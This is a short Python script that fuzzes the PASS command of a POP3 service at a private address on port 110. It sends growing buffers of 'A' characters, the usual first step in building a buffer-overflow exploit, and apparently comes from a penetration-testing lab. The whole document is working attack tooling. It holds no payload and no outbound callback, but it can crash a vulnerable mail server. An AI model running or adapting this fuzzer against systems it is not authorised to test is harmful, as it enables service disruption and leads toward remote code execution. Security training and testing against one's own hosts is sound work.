#!/usr/bin/python3
import socket
buffer = ["A"]
count = 100
while len(buffer) <= 50:
    buffer.append("A"*count)
    count = count + 200;

for string in buffer:
    print("Fuzzing PASS with %s bytes" % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    connect = s.connect(('192.168.0.121', 110))                        
    s.recv(1024)
    s.send(b"USER admin\r\n")
    s.recv(1024)
    s.send(b"PASS " + bytes(string, encoding="utf-8") + b"\r\n")
    s.recv(1024)
    s.send(b"QUIT\r\n")
    s.close()
